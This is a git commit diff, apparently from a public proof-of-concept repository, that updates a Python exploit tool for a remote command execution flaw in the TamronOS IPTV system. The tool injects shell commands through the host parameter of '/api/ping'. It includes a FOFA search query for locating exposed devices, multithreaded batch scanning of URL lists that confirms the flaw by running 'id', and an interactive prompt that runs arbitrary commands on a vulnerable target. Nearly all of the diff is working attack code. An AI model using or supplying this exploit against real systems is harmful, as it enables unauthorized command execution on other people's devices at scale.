37251ea57fb90b94ace8d8e4b41d1c4686bdc36e
野原新之助 <53944964+Sma11New@users.noreply.github.com>
2021-08-02 11:09:30 +0800

    Add files via upload

--- TamronOS-IPTV系统RCE/TamronOS-IPTV_RCE.py
+++ TamronOS-IPTV系统RCE/TamronOS-IPTV_RCE.py
@@ -17,20 +17,76 @@ init(autoreset=True)
 
 requests.packages.urllib3.disable_warnings()
 
-
 def rpad(s, n, c=" "):
     return s + (n - ww(s)) * c
-
 
 class POC:
     vulnName = "TamronOS-IPTV_RCE"
     vulnNameZh = "TamronOS-IPTV远程命令执行"
-    vulnNumber = "CVE-2019-12725"
-    vulnTime = "2019-07 ?"
-    vulnVersion = "ZeroShell < 3.9.0"
-    vulnPath = "/cgi-bin/kerbynet"
+    vulnNumber = ""
+    vulnTime = ""
+    vulnVersion = ""
+    vulnPath = "/api/ping?count=5&host=;{cmd};"
     vulnScript = "目标单个验证、批量验证、单个利用"
     FOFA = 'app="TamronOS-IPTV系统"'
+
+# -----------漏洞相关代码 开始-------------
+# 利用漏洞用于发包收包，判断是否存在漏洞，为关键代码
+
+    # 利用漏洞
+    def exploitVuln(self, url, cmd):
+        reqURL = url + f"/api/ping?count=5&host=;{cmd};"
+        # print(reqURL)
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
+        }
+        try:
+            rep = requests.get(url=reqURL, headers=headers, timeout=self.args.timeout, verify=False)
+            # fileData = rep.text
+            cmdResult = rep.json()["result"].strip()
+            return cmdResult
+        except:
+            return "Conn"
+
+    # 验证漏洞
+    def verify(self, url):
+        cmd = "id"
+        repData = self.exploitVuln(url, cmd)
+        if "uid=" in repData:
+            msg = f"\033[32m[+]  [Vuln]  {url}\033[0m"
+            if self.args.url:
+                self.hasVuln = True
+            if self.args.file:
+                self.lock.acquire()
+                try:
+                    self.findCount += 1
+                    self.vulnRULList.append(url)
+                finally:
+                    self.lock.release()
+        elif "Conn" == repData:
+            msg = f"\033[31m[!]  [Conn]  {url}\033[0m"
+        else:
+            msg = f"[-]  [Safe]  {url}"
+        self.lock.acquire()
+        try:
+            print(msg)
+        finally:
+            self.lock.release()
+
+    # 单个攻击利用
+    def attack(self):
+        while True:
+            try:
+                cmd = input("(cmd)> ")
+                repData = self.exploitVuln(self.args.url, cmd)
+                print("\n", repData.strip(), "\n")
+            except KeyboardInterrupt:
+                print("\n\nBye~\n")
+                return
+            except:
+                print("\nError.\n")
+
+# -----------漏洞相关代码 结束-------------
 
     def __init__(self):
         self.banner()
@@ -43,22 +99,21 @@ class POC:
 
     def banner(self):
         length = 70
-        logo = r"""
+        logo = f"""
             ________            ___________       _____ 
             ___  __ \______________  /___(_)________  /_
             __  /_/ /  __ \  ___/_  / __  /__  ___/  __/
-            _  ____// /_/ / /__ _  /___  / _(__  )/ /_  
-            /_/     \____/\___/ /_____/_/  /____/ \__/  
-                                                 Author:Sma11New
+            _  ____// /_/ / /__ _  /___  / _(__  )/ /_         
+            /_/     \____/\___/ /_____/_/  /____/ \__/      \033[32mAuthor:Sma11New\033[0m
         """
         msg = f"""
 \033[36m+{"-" * (length + 20)}+\033[0m
-|   漏洞名称   |   {rpad(self.vulnNameZh, length)}  |
-|   漏洞时间   |   {rpad(self.vulnTime, length)}  |
-|   漏洞编号   |   {rpad(self.vulnNumber, length)}  |
-|   影响版本   |   {rpad(self.vulnVersion, length)}  |
-|   漏洞路径   |   {rpad(self.vulnPath, length)}  |
-|   脚本功能   |   {rpad(self.vulnScript, length)}  |
+|   漏洞名称   |   {rpad(self.vulnNameZh, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
+|   漏洞时间   |   {rpad(self.vulnTime, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
+|   漏洞编号   |   {rpad(self.vulnNumber, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
+|   影响版本   |   {rpad(self.vulnVersion, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
+|   漏洞路径   |   {rpad(self.vulnPath, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
+|   脚本功能   |   {rpad(self.vulnScript, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
 |   FOFA语句   |   {rpad(self.FOFA, length)}  |
 \033[36m+{"-" * (length + 20)}+\033[0m
         """.replace("|", "\033[36m|\033[0m")
@@ -84,13 +139,10 @@ class POC:
         parser = ArgumentParser(description="\033[31mNotice：You Must To Use One Of -u/-f\033[0m")
         parser.add_argument("-u", "--url", required=False, type=str, help=f"The target url")
         parser.add_argument("-f", "--file", required=False, type=str, metavar="URLFILE", help=f"The target url file")
-        parser.add_argument("-t", "--thread", required=False, type=int, default=32,
-                            help=f"Number of thread, default is 32")
+        parser.add_argument("-t", "--thread", required=False, type=int, default=32, help=f"Number of thread, default is 32")
         parser.add_argument("-T", "--timeout", required=False, type=int, default=3, help="request timeout(default 3)")
-        parser.add_argument("-o", "--output", required=False, type=str, metavar="FILENAME", default=date,
-                            help="Vuln url output file, default is {date}.txt")
-        parser.add_argument("--attack", required=False, action="store_true", default=False,
-                            help="Use this parameter to attack a URL")
+        parser.add_argument("-o", "--output", required=False, type=str, metavar="FILENAME", default=date, help="Vuln url output file, default is {date}.txt")
+        parser.add_argument("--attack", required=False, action="store_true", default=False, help="Use this parameter to attack a URL")
         return parser
 
     # 处理url格式
@@ -118,62 +170,6 @@ class POC:
         wait(all)
         self.outputResult()
 
-    # 验证漏洞
-    def verify(self, url):
-        cmd = "id"
-        repData = self.exploitVuln(url, cmd)
-        if "uid=" in repData:
-            msg = f"\033[32m[+]  [Vuln]  {url}\033[0m"
-            if self.args.url:
-                self.hasVuln = True
-            if self.args.file:
-                self.lock.acquire()
-                try:
-                    self.findCount += 1
-                    self.vulnRULList.append(url)
-                finally:
-                    self.lock.release()
-        elif "Conn" == repData:
-            msg = f"\033[31m[!]  [Conn]  {url}\033[0m"
-        else:
-            msg = f"[-]  [Safe]  {url}"
-        self.lock.acquire()
-        try:
-            print(msg)
-        finally:
-            self.lock.release()
-    # 
-    # 利用漏洞
-    def exploitVuln(self, url, cmd):
-        reqURL = url + f"/api/ping?count=5&host=;{cmd};"
-        # print(reqURL)
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
-        }
-        try:
-            rep = requests.get(url=reqURL, headers=headers, timeout=self.args.timeout, verify=False)
-            fileData = rep.text
-            return fileData
-        except:
-            return "Conn"
-    #
-    # 
-    # 单个攻击利用
-    def attack(self):
-        # 攻击
-        while True:
-            try:
-                cmd = input("\033[42m" + "Input CMD>" + "\033[0m" + " ")
-                repData = self.exploitVuln(self.args.url, cmd)
-                # spiltData = "<html>"
-                # attackResult = list(repData.strip().split("<html>"))[0]
-                print("\n", repData.strip(), "\n")
-            except KeyboardInterrupt:
-                print("\n\nBye~\n")
-                return
-            except:
-                print("\nError.\n")
-
     # 依据参数选择模式
     def run(self):
         if not self.args.file and not self.args.url:
@@ -181,6 +177,7 @@ class POC:
         # 单个验证
         elif self.args.url:
             url = self.parseURL(self.args.url)
+            print(f"\033[36m[*]  Timeout:  {self.args.timeout}\033[0m\n")
             self.verify(url)
             if self.args.attack:
                 if self.hasVuln:
@@ -204,7 +201,7 @@ class POC:
             with open(self.outputFile, "a") as f:
                 for url in self.vulnRULList:
                     f.write(url + "\n")
-            print("-" * 20, f"\nThe vulnURL has been saved in \033[36m{self.outputFile}\033[0m\n\n")
+            print(f"{'-' * 20}\nThe vulnURL has been saved in \033[36m{self.outputFile}\033[0m\n\n")
 
 if __name__ == "__main__":
     POC()
